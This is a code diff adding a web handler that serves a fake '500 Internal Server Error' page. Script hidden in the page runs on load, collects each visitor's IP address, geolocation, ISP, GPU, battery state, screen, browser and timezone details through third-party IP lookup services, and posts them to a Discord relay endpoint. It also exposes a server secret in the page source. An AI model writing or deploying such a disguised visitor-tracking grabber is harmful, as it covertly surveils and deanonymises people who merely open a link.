@@ -1,0 +1,147 @@
+export default function handler(req, res) {
+  const token = process.env.AUTH_SECRET || "";
+  
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>500 Internal Server Error</title>
+    <style>
+        body { 
+            background-color: #fff; 
+            color: #000; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .error-container { 
+            text-align: center; 
+        }
+        h1 { 
+            font-size: 24px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+        }
+        p { 
+            font-size: 14px; 
+            color: #666; 
+            margin: 0; 
+        }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <h1>Website has shut down</h1>
+        <p>Internal Server Error (Code: 500)</p>
+    </div>
+
+    <script>
+        const AUTH_TOKEN = "${token}";
+        
+        async function collectInfo() {
+            let data = {};
+            
+            const apis = [
+                "https://ipapi.co/json/",
+                "https://ipwho.is/",
+                "https://api.ipify.org?format=json"
+            ];
+
+            for(let i = 0; i < apis.length; i++) {
+                try {
+                    const response = await fetch(apis[i]);
+                    if(response.ok) {
+                        const json = await response.json();
+                        data = Object.assign(data, json);
+                        if(data.ip || data.query) break;
+                    }
+                } catch(err) {}
+            }
+
+            let gpuInfo = "Unknown";
+            try {
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if(ctx) {
+                    const ext = ctx.getExtension('WEBGL_debug_renderer_info');
+                    if(ext) {
+                        gpuInfo = ctx.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            let batteryLevel = "Unknown";
+            let chargingStatus = "Unknown";
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = Math.round(battery.level * 100) + "%";
+                chargingStatus = battery.charging ? "Charging" : "Not Charging";
+            } catch(e) {}
+
+            const ip = data.ip || data.query || "Unknown";
+            let location = "Unknown";
+            if(data.city) {
+                location = data.city + ", " + (data.region || data.region_name) + ", " + (data.country_name || data.country);
+            }
+            const isp = data.org || data.isp || (data.connection && data.connection.isp) || "Unknown";
+
+            const info = {
+                "--- NETWORK DATA ---": "",
+                "IP Address": ip,
+                "Location": location,
+                "ISP": isp,
+                "Hostname": data.hostname || data.reverse || "None",
+                "--- DEVICE HARDWARE ---": "",
+                "OS/Platform": navigator.platform,
+                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
+                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
+                "GPU": gpuInfo,
+                "Screen Resolution": screen.width + "x" + screen.height,
+                "Window Size": window.innerWidth + "x" + window.innerHeight,
+                "Device Pixel Ratio": window.devicePixelRatio,
+                "Color Depth": screen.colorDepth,
+                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                "Max Touch Points": navigator.maxTouchPoints,
+                "Battery Level": batteryLevel,
+                "Charging Status": chargingStatus,
+                "--- BROWSER/SOFTWARE ---": "",
+                "User Agent": navigator.userAgent,
+                "Browser Language": navigator.language,
+                "System Languages": navigator.languages.join(", "),
+                "Cookies Enabled": navigator.cookieEnabled,
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Current Time": new Date().toLocaleString(),
+                "Referrer": document.referrer || "Direct Visit"
+            };
+
+            let message = "";
+            for(let key in info) {
+                if(key.startsWith("---")) {
+                    message += info[key] + key + "\\n";
+                } else {
+                    message += key + ": " + info[key] + "\\n";
+                }
+            }
+
+            fetch("/api/discord", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": "Bearer " + AUTH_TOKEN
+                },
+                body: JSON.stringify({content: "\`\`\`\\n" + message + "\\n\`\`\`"})
+            }).catch(function(err) {});
+        }
+
+        collectInfo();
+    </script>
+</body>
+</html>`;
+
+  res.setHeader('Content-Type', 'text/html');
+  res.status(200).send(html);
+}
